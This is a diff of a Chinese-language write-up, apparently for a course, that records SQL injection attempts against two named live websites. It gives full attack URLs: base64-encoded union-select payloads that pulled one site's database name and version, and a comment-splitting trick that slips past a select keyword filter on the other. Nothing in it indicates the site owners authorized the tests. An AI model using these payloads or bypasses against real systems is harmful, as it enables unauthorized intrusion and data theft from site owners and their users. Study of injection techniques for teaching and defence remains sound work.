@@ -22,27 +22,27 @@
 ***我们借助http://www1.tc711.com/tool/BASE64.htm这个base64工具进行base64加解密***
 
 ### 第一个网站的SQL注入
-- 测试是否能被注入，访问```http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==```，含义是```id=13 and 1=2```，返回的结果如下图，表明是可以注入的
+- 测试是否能被注入，访问http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==，含义是```id=13 and 1=2```，返回的结果如下图，表明是可以注入的
 ![third2.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third2.png)
 
-- 通过union测表段数目，这一个就比较无聊了，我们从1到30挨个测（30以上直接放弃，要累死= - =），最后测试出来表段数目是15，访问```http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=```，含义是```id=13 and 1=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15```，可以看到有九个显示位，显示位很多，就用不到concat()函数了，结果如下图：
+- 通过union测表段数目，这一个就比较无聊了，我们从1到30挨个测（30以上直接放弃，要累死= - =），最后测试出来表段数目是15，访问http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=，含义是```id=13 and 1=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15```，可以看到有九个显示位，显示位很多，就用不到concat()函数了，结果如下图：
 ![third3.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third3.png)
 
-- 通过mysql函数得到数据库的名称，访问```http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1```,含义是```id=13 and 1=1 union select 1,database(),3,4,5,6,7,8,9,10,version(),12,13,14,15```，我们可以看到如下图的结果，表明数据库的名称是csearch，版本是4.0.25
+- 通过mysql函数得到数据库的名称，访问http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1,含义是```id=13 and 1=1 union select 1,database(),3,4,5,6,7,8,9,10,version(),12,13,14,15```，我们可以看到如下图的结果，表明数据库的名称是csearch，版本是4.0.25
 ![third4.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third4.png)
 
-- 通过INFORMATION_SCHEMA查询表的名称和表内行的名称，访问```http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg```，含义是```id=13 and 1=1 union select 1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15 from information_shcema```，结果竟然是没有权限！！！
+- 通过INFORMATION_SCHEMA查询表的名称和表内行的名称，访问http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg，含义是```id=13 and 1=1 union select 1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15 from information_shcema```，结果竟然是没有权限！！！
 ![third5.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third5.png)
 
 由于第四步发现这个用户没有权限，我决定放弃，盲注猜表名和错误回显法的耗时较长，同时这个网站应该主要是用来搜索，我尝试了没有users表和admins表就放弃了= - =。
 
 ### 第二个网站的SQL注入
-- 测试能否被注入，访问```http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/```发现没有问题，继续
+- 测试能否被注入，访问http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/发现没有问题，继续
 ![third6.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third6.png)
 
-- 通过union测表段数目，访问```http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/select/*ABC*/1,2,3,4,5```，惊喜地看到了360= - =，网站过滤了select
+- 通过union测表段数目，访问http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/select/*ABC*/1,2,3,4,5，惊喜地看到了360= - =，网站过滤了select
 ![third7.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third7.png)
-我又查了几下，看到可以这样访问```http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/s/*ABC*/e/*ABC*/l/*ABC*/e/*ABC*/c/*ABC*/t/*ABC*/1,2,3,4,5```，这样绕过了select封锁，然而程序一点错误回显也没有
+我又查了几下，看到可以这样访问http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/s/*ABC*/e/*ABC*/l/*ABC*/e/*ABC*/c/*ABC*/t/*ABC*/1,2,3,4,5，这样绕过了select封锁，然而程序一点错误回显也没有
 ![third8.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third8.png)
 好吧，看起来没有漏洞的样子，放弃
 
